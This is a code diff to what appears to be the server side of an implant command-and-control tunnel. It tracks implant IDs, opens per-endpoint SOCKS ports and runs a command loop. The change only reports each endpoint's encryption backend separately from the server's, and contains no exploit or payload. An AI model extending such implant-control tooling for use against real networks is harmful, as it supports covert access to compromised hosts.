@@ -340,6 +340,10 @@ class _CommandChannel(object):
         self.implant_id = None      # type: Optional[str]
         self.hostname = None        # type: Optional[str]
         self.os_name = None         # type: Optional[str]
+        # Which AES backend the *endpoint* has, as its HELLO reported it.
+        # Not this process's: `crypto_path()` answers for the server, and
+        # the two halves are different hosts with different libcrypto.
+        self.crypto = None          # type: Optional[str]
         self.connected_at = time.time()
         self.last_seen = self.connected_at
         self.last_ping = self.connected_at
@@ -573,7 +577,15 @@ class TunnelServer(object):
                                   if channel is not None else None),
                 "connected_for": (now - channel.connected_at
                                   if channel is not None else None),
-                "crypto": crypto_path(),
+                # Two halves, two answers, and both matter to throughput:
+                # this process encrypts every relayed byte as well, so a
+                # fast endpoint behind a pure-Python server is just as
+                # slow. `endpoint_crypto` comes from the HELLO and is
+                # None for a disconnected row, because nothing on this
+                # side can know it.
+                "server_crypto": crypto_path(),
+                "endpoint_crypto": (channel.crypto
+                                    if channel is not None else None),
             })
         return rows
 
@@ -744,6 +756,7 @@ class TunnelServer(object):
         channel.hostname = _text(body.get("hostname"))
         channel.os_name = _text(body.get("os"))
         channel.implant_id = _text(body.get("implant_id"))
+        channel.crypto = _text(body.get("crypto"))
 
         with self._lock:
             present = self._channels.get(identity)
@@ -771,8 +784,9 @@ class TunnelServer(object):
         with self._lock:
             channel.ready = True
             channel.touch()
-        logger.info("tunnel: %s registered as %r, SOCKS port %d, crypto %s",
-                    peer, identity, channel.port, crypto_path())
+        logger.info("tunnel: %s registered as %r, SOCKS port %d, crypto %s "
+                    "here and %s there", peer, identity, channel.port,
+                    crypto_path(), channel.crypto or "unreported")
         try:
             self._command_loop(channel)
         finally:
